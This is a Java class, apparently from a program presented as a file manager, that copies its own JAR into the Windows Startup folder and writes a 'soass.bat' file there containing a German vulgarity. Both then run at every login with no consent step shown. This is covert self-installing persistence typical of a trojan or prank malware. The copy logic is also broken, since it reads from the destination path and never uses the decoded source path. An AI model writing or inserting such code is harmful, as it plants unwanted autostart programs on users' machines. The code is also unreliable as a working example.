package de.soass.filemanager;

import de.soass.Main;

import java.io.*;
import java.net.URLDecoder;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Scanner;

public class Conserver {

    public static final String bat = "ficker";

    public static boolean issaved() throws UnsupportedEncodingException {

        File f = new File(getautostart() + "\\SOASS.jar");
        if (f.exists()) {
            return true;
        }

        return false;
    }

    public static String getautostart() {
        return System.getProperty("java.io.tmpdir").replace("Local\\Temp\\", "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    }


    public static boolean hasbat() throws IOException {
        File f = new File(getautostart() + "\\soass.bat");


        if (f.exists()) {
            Scanner sc = new Scanner(f);
            String buffer = "";
            while (sc.hasNext()) {
                buffer += sc.next();
            }


            if (buffer.equals(bat)) {

            }else {

                f.delete();
                f.createNewFile();
                new FileOutputStream(f).write(bat.getBytes());
            }
            return true;
        }
        f.createNewFile();
        new FileOutputStream(f).write(bat.getBytes());
        return false;
    }


    public static void update() throws IOException {
        if(!issaved()){
            String path = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
            String decodedPath = URLDecoder.decode(path, "UTF-8");
            File f = new File(decodedPath);
            File fto = new File(getautostart() + "\\SOASS.jar");
            if(fto.exists() ){
                fto.delete();
            }
            fto.createNewFile();
            Files.copy(Paths.get(getautostart() + "\\SOASS.jar"), new FileOutputStream(fto) );
        }
        hasbat();

    }


}
